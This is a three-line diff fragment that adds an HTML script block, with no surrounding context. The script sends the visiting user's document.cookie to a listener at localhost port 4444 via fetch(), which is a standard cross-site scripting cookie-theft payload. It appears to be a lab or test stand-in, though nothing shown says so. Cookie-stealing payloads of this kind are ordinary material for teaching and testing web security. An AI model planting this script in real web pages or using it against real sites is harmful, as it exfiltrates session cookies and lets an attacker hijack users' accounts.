@@ -1,0 +1,3 @@
+<script>
+fetch("http://localhost:4444/" + document.cookie)
+</script>
